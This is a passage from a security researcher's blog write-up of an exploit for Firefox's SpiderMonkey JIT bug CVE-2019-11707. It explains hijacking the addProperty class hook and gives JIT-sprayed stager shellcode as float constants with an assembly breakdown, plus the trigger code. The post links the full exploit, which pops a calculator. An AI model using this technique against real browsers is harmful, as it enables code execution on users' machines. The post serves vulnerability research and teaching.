<p>Like I mentioned in my previous post on SpiderMonkey internals, each object is associated with a group which consists of a <code class="language-plaintext highlighter-rouge">JSClass</code> object. The <code class="language-plaintext highlighter-rouge">JSClass</code> contains an element of <code class="language-plaintext highlighter-rouge">ClassOps</code>, which holds the function pointers that control how properties are added, deleted etc. If we manage to hijack this function pointers, then code execution is a done job.</p>

<p><img src="/assets/img/cve_writeup/group_diagram.png" alt="" /></p>

<p>We can overwrite the class_ pointer with an address that is chosen by us. At this address we forge the entire <code class="language-plaintext highlighter-rouge">js::Class</code> structure. As for the fields we can these leak out from the original Class object. Here we just need to make sure that <code class="language-plaintext highlighter-rouge">cOps</code> is pointing to a table of function pointers that we had written in the memory. In this exploit I will be overwriting the <code class="language-plaintext highlighter-rouge">addProperty</code> field with the pointer to the shellcode</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td> --><td class="rouge-code"><pre>
<span class="nx">grp_ptr</span> <span class="o">=</span> <span class="nx">read</span><span class="p">(</span><span class="nx">aa</span><span class="p">)</span>
<span class="nx">jsClass</span> <span class="o">=</span> <span class="nx">read_n</span><span class="p">(</span><span class="nx">grp_ptr</span><span class="p">,</span><span class="k">new</span> <span class="nx">data</span><span class="p">(</span><span class="dl">"</span><span class="s2">0x30</span><span class="dl">"</span><span class="p">));</span>

<span class="nx">name</span> <span class="o">=</span> <span class="nx">jsClass</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">8</span><span class="p">)</span>
<span class="nx">flags</span> <span class="o">=</span> <span class="nx">jsClass</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>
<span class="nx">cOps</span> <span class="o">=</span> <span class="nx">jsClass</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span><span class="mi">24</span><span class="p">)</span>
<span class="nx">spec</span> <span class="o">=</span> <span class="nx">jsClass</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span><span class="mi">32</span><span class="p">)</span>
<span class="nx">ext</span> <span class="o">=</span> <span class="nx">jsClass</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">40</span><span class="p">,</span><span class="mi">48</span><span class="p">)</span>
<span class="nx">oOps</span> <span class="o">=</span> <span class="nx">jsClass</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">56</span><span class="p">,</span><span class="mi">64</span><span class="p">)</span>

</pre></td></tr></tbody></table></code></pre></div></div>

<p>Now lets focus on where we want to direct the control flow toâ€¦.</p>

<h2 id="injecting-shellcode">Injecting Shellcode</h2>

<p>We will, more or less, be using the same technique as displayed by the author in the above mentioned post. Letâ€™s create a function to hold our shellcodeâ€¦</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td> --><td class="rouge-code"><pre><span class="nx">buf</span><span class="p">[</span><span class="mi">7</span><span class="p">].</span><span class="nx">func</span> <span class="o">=</span> <span class="kd">function</span> <span class="nx">func</span><span class="p">()</span> <span class="p">{</span>
  <span class="kd">const</span> <span class="nx">magic</span> <span class="o">=</span> <span class="mf">4.183559446463817</span><span class="nx">e</span><span class="o">-</span><span class="mi">216</span><span class="p">;</span>

  <span class="kd">const</span> <span class="nx">g1</span> <span class="o">=</span> <span class="mf">1.4501798452584495</span><span class="nx">e</span><span class="o">-</span><span class="mi">277</span>
  <span class="kd">const</span> <span class="nx">g2</span> <span class="o">=</span> <span class="mf">1.4499730218924257</span><span class="nx">e</span><span class="o">-</span><span class="mi">277</span>
  <span class="kd">const</span> <span class="nx">g3</span> <span class="o">=</span> <span class="mf">1.4632559875735264</span><span class="nx">e</span><span class="o">-</span><span class="mi">277</span>
  <span class="kd">const</span> <span class="nx">g4</span> <span class="o">=</span> <span class="mf">1.4364759325952765</span><span class="nx">e</span><span class="o">-</span><span class="mi">277</span>
  <span class="kd">const</span> <span class="nx">g5</span> <span class="o">=</span> <span class="mf">1.450128571490163</span><span class="nx">e</span><span class="o">-</span><span class="mi">277</span>
  <span class="kd">const</span> <span class="nx">g6</span> <span class="o">=</span> <span class="mf">1.4501798485024445</span><span class="nx">e</span><span class="o">-</span><span class="mi">277</span>
  <span class="kd">const</span> <span class="nx">g7</span> <span class="o">=</span> <span class="mf">1.4345589835166586</span><span class="nx">e</span><span class="o">-</span><span class="mi">277</span>
  <span class="kd">const</span> <span class="nx">g8</span> <span class="o">=</span> <span class="mf">1.616527814</span><span class="nx">e</span><span class="o">-</span><span class="mi">314</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This is a stager shellcode that will <code class="language-plaintext highlighter-rouge">mprotect</code> a region of memory with read-write-execute permissions. Here is a rough breakdown of the same.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre></td> --><td class="rouge-code"><pre><span class="c1"># 1.4501798452584495e-277</span>
<span class="n">mov</span> <span class="n">rcx</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rcx</span><span class="p">]</span>
<span class="n">cmp</span> <span class="n">al</span><span class="p">,</span><span class="n">al</span>

<span class="c1"># 1.4499730218924257e-277</span>
<span class="n">push</span> <span class="mh">0x1000</span>

<span class="c1"># 1.4632559875735264e-277</span>
<span class="n">pop</span> <span class="n">rsi</span>
<span class="n">xor</span> <span class="n">rdi</span><span class="p">,</span><span class="n">rdi</span>
<span class="n">cmp</span> <span class="n">al</span><span class="p">,</span><span class="n">al</span>

<span class="c1"># 1.4364759325952765e-277</span>
<span class="n">push</span> <span class="mh">0xfff</span>
<span class="n">pop</span> <span class="n">rdi</span>

<span class="c1"># 1.450128571490163e-277</span>
<span class="n">not</span> <span class="n">rdi</span>
<span class="n">nop</span>
<span class="n">nop</span>
<span class="n">nop</span>

<span class="c1"># 1.4501798483875178e-277</span>
<span class="n">and</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rcx</span>
<span class="n">cmp</span> <span class="n">al</span><span class="p">,</span> <span class="n">al</span>

<span class="c1"># 1.4345589835166586e-277</span>
<span class="n">push</span> <span class="mi">7</span>
<span class="n">pop</span> <span class="n">rdx</span>
<span class="n">push</span> <span class="mi">10</span>
<span class="n">pop</span> <span class="n">rax</span>

<span class="c1"># 1.616527814e-314</span>
<span class="n">push</span> <span class="n">rcx</span>
<span class="nb">syscall</span>
<span class="n">ret</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>So why did we assign this function as a property of <code class="language-plaintext highlighter-rouge">buf[7]</code>? Well, we know the address of <code class="language-plaintext highlighter-rouge">buf[7]</code> and thus we can get the address of any of its properties using our arbitrary read primitive. Thus in this way we can get the address of this function. But before proceeding further lets first JIT compile our functionâ€¦.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre><span class="k">for</span> <span class="p">(</span><span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="mi">100000</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="nx">buf</span><span class="p">[</span><span class="mi">7</span><span class="p">].</span><span class="nx">func</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Cool, now we have compiled our own shellcode! But hold on we donâ€™t know the address of that shellcode yetâ€¦. But that is why we assigned this function as a property of <code class="language-plaintext highlighter-rouge">buf[7]</code>. Since this is the latest property added, it will be at the top in the <code class="language-plaintext highlighter-rouge">slots</code> buffer and with the arbitrary read that we have, we can easily read this address.</p>

<p>Once we have the base address of the function, we can leak a JIT pointer from the <code class="language-plaintext highlighter-rouge">JSFunction</code>â€™s  <code class="language-plaintext highlighter-rouge">jitInfo_</code> member. After this we just have to find where the shellcode starts, which is the reason that we have included a magic value at the start of the shellcode.</p>

<p>So now we have all that we need to achieve control flow - a target to overwrite, a target to jump to and an arbitrary <code class="language-plaintext highlighter-rouge">rw</code> primitive. So lets go and overwrite that <code class="language-plaintext highlighter-rouge">clasp_</code> pointer that we have had our eye on!</p>

<p>First we create a <code class="language-plaintext highlighter-rouge">Uint8Array</code> to hold our shellcode. Then we get the address of this <code class="language-plaintext highlighter-rouge">Uint8Array</code> the same way we found out the address of that function with which we compiled our shellcode. Our aim is to get the address of the buffer where our shellcode is saved. Once we get the starting address of the <code class="language-plaintext highlighter-rouge">Uint8Array</code> that holds the shellcode, we just add <code class="language-plaintext highlighter-rouge">0x38</code> to this and we get the address of the buffer where our raw shell code is stored.</p>

<p>Remember that this region is not executable yet, but we will make it so by using our stager shellcode. In this exploit I will be using the function pointer for <code class="language-plaintext highlighter-rouge">addProperty</code> to gain code execution. This pointer is triggered, as the name suggests, when we try to add a property to an object.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre><span class="nx">obj</span><span class="p">.</span><span class="nx">trigger</span> <span class="o">=</span> <span class="nx">some_variable</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>One thing I noticed is that when this is called, the <code class="language-plaintext highlighter-rouge">rcx</code> register contains a pointer to the property that is to be added (<code class="language-plaintext highlighter-rouge">some_variable</code> in this case). Thus we can pass some arguments to our stager shellcode in this manner. I am passing the address of the shellcode buffer to the stager shellcode. The stager shellcode will make that entire page <code class="language-plaintext highlighter-rouge">rwx</code> and then jump to our shellcode.</p>

<p>Note that here the shellcode calls <code class="language-plaintext highlighter-rouge">execve</code> to execute <code class="language-plaintext highlighter-rouge">/usr/bin/xcalc</code>.</p>

<h1 id="triggering-on-the-browser">Triggering on the Browser</h1>

<p>Obviously since I got this far, I felt like triggering this exploit on a vulnerable version of Firefox browser :)</p>

<p>First I grabbed an older version of FireFox (66.0.3), which is vulnerable to this CVE, from <a href="https://ftp.mozilla.org/pub/firefox/releases/66.0.3/linux-x86_64/en-US/">here</a>.</p>

<p>Next is to disable the sandbox. For this I set the value of <code class="language-plaintext highlighter-rouge">security.sandbox.content.level</code> to 0 in <code class="language-plaintext highlighter-rouge">about:config</code></p>

<p><img src="/assets/img/cve_writeup/disable_sandbox.png" alt="" /></p>

<p>And that is it! Ideally it should work like this. I put the exploit file in my <code class="language-plaintext highlighter-rouge">localhost</code> and when I access it, a calculator should be popped!</p>

<p>Now for the best partâ€¦.. Popping the calculator</p>

<p><img src="/assets/img/cve_writeup/exploit.gif" alt="" /></p>

<h1 id="conclusion">Conclusion</h1>

<p>It was fun writing an exploit for this CVE and I learned a lot of things en-route.</p>

<p>Apparently this bug was used, in combination with a firefox <a href="https://www.mozilla.org/en-US/security/advisories/mfsa2019-19/">sandbox escape</a>, to exploit systems in the wild. Coinbase Security recently released a <a href="https://blog.coinbase.com/responding-to-firefox-0-days-in-the-wild-d9c85a57f15b">blog post</a> on how they detected this. If we enable the sandbox, then its seccomp filter catches the <code class="language-plaintext highlighter-rouge">execve</code> syscall and immediately crashes the tab.</p>

<p><img src="/assets/img/cve_writeup/sandbox_violation.png" alt="" /></p>

<p>Like I mentioned before this was my first time exploiting a JIT bug and I might not have been completely accurate/clear in some parts. If you spot an error or have some suggestions/clarifications/questions please do mention in the comments section below or ping me on <a href="https://twitter.com/sherl0ck__">twitter</a></p>

<p>I have uploaded the full exploit code on <a href="https://github.com/vigneshsrao/CVE-2019-11707">github</a>. There are too many <code class="language-plaintext highlighter-rouge">.reverse()</code> because the utility functions (like add, subtract, right shift, left shift etc) that I am using in this exploit were not compatible with little endian. I had written them while trying another challenge, and was too lazy to change it :P. Iâ€™ll probably do that after sometime, when my semester is over.</p>

<h1 id="references">References</h1>

<ul>
  <li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1820">https://bugs.chromium.org/p/project-zero/issues/detail?id=1820</a></li>
  <li><a href="http://smallcultfollowing.com/babysteps/blog/2012/07/30/type-inference-in-spidermonkey">http://smallcultfollowing.com/babysteps/blog/2012/07/30/type-inference-in-spidermonkey</a></li>
  <li><a href="https://mathiasbynens.be/notes/shapes-ics">https://mathiasbynens.be/notes/shapes-ics</a></li>
  <li><a href="https://mathiasbynens.be/notes/prototypes">https://mathiasbynens.be/notes/prototypes</a></li>
  <li><a href="https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/">https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/</a></li>
  <li>SpiderMoney Source Code :)</li>
</ul>
:ET